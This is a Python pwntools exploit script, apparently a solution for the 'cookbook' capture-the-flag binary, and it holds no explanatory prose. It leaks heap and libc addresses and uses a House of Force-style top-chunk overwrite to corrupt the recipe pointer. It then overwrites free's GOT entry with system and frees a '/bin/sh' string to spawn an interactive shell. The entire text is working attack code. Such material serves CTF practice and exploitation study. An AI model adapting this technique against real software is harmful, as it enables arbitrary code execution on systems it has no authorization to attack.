#!/usr/bin/env python

from pwn import *
import sys

context.log_level = "debug"

elf = "./cookbook"

recipe_addr = 0x804d0a0
calloc_got = 0x804d048
free_got = 0x804d018
calloc_off = 0x71810
system_off = 0x3ada0

p = process(elf)

p.recvline("what's your name?")
p.sendline("test")

p.recvuntil("[q]uit\n")

# leak heap

p.sendline("c")
p.sendline("n")
p.sendline("a")
p.sendline("water")
p.sendline("0x1")
p.sendline("d")
p.sendline("p")

p.recvuntil("recipe type: (null)\n\n")
top_chunk_addr =  int(p.recv(9))
heap_base = top_chunk_addr - 0x16d8
log.info("top_chunk_addr: "+hex(top_chunk_addr))
log.info("heap_base: "+hex(heap_base))

# leak libc
p.sendline("n")
p.sendline("g")
payload = p8(0)*0x3a0
payload += p32(0xffffffff)
p.sendline(payload)

off_size = recipe_addr - (top_chunk_addr + 0x4) - (2 * 0x4)

p.sendline("q")
p.sendline("g")
p.recvuntil("hacker!) :")
p.sendline(hex(off_size))
p.sendline()

p.sendline("g")
p.recvuntil("hacker!) :")
p.sendline(hex(0x20))
payload = p32(free_got-0x8c)
payload += p32(0)*2
payload += p32(calloc_got)
p.sendline(payload)

p.recvuntil("[q]uit\n")
p.sendline("r")
libc_base = u32(p.recv(4))-calloc_off
log.info("libc_base: "+hex(libc_base))

# write system

p.recvuntil("[q]uit\n")
p.sendline("c")
p.sendline("g")

system_addr = libc_base+system_off
p.sendline(p32(system_addr))

#gdb.attach(p)
p.recvuntil("[q]uit\n")
p.sendline("q")
p.sendline("g")
p.sendline(hex(0x10))
p.sendline("/bin/sh")
p.recvuntil("[q]uit\n")
p.sendline("q")

p.interactive()
